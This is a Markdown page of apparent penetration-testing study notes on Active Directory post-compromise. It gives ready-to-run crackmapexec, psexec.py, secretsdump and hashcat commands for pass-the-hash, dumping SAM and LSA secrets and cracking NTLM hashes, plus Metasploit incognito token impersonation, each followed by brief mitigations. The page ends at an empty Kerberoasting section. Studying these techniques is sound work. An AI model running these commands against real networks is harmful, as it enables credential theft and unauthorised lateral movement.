---
layout: default
title: 03. Active Directory Post Compromise
nav_order: 2
has_children: false
parent: Active Directory
grand_parent: Pentesting
---

## 03.Active Directory Post Compromise


### Pass The Hash

Pass The Password / Pass The Hash

You can pass NTLM hashes but not NTLMv2 hashes.

#### Using crackmapexec

[Source](https://wiki.porchetta.industries/)

Can be used with password:

```bash
crackmapexec smb $IP/$CIDR -u username -d EVIL_DOMAIN -p password
```

Or with hashes:

```bash
crackmapexec smb $IP/$CIDR -u username -H hash --local-auth
```

Accessing another instance pwned could be done using [`psexec.py`](https://github.com/fortra/impacket/blob/master/examples/psexec.py) :

```bash
psexec.py evil/username:password@target_ip
```

#### Dumping hashes

It requires access to another host.

Using [secretdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) we could retrieve hashes from host:

```bash
secretdump.py evil/username:password@target_ip
```

It gives the SAM hashes and the LSA secrets of the host.

#### Cracking the hashes

Using hashcat:

```bash
hashcat -m 1000 hashes.txt rockyou.txt -O 
```

#### Only passing the hash

We will use only the second part of the hash:

![](/writings/docs/assets/Hashes.png)

![](docs/assets/Hashes.png)

Using crackmapexec:
```bash
crackmapexec smb $IP/$CIDR -u "Username" -H <hash> --local-auth
```

We could try to get a shell access using only the hash and psexec:

```bash
psexec.py "username":@target_ip -hashes LMHASH:NTHASH
```

(`LMHASH:NTHASH` correspond to the full hash retrieve previously)

#### Mitigations

- Limit account reuse
- Utilize strong password
- Implement Privilege Access Management (PAM)


### Token Impersonation

Token are temporary key allowing access to system / network without having to provide credentials.

There is 2 types:
- Delegate - Create to login to a machine / using RDP
- Impersonate - "Non interractive", attaching network drive or domain logon script

#### Using Incognito

Require a shell on a machine.
From an existing metasploit session, we could use the load command to load the `incognito` tool inside our target.

Once the tool loaded, we could start by listing the tokens available: 

```bash
list_tokens -u
```

Then from this list we could select a user we want to impersonate:

```bash
impersonate_token evil\\administrator
```

Metasploit handle everything for us. 

#### Mitigation

- Limit user/group token creation permission
- Account tiering 
- Local admin restriction


### Kerberoasting 








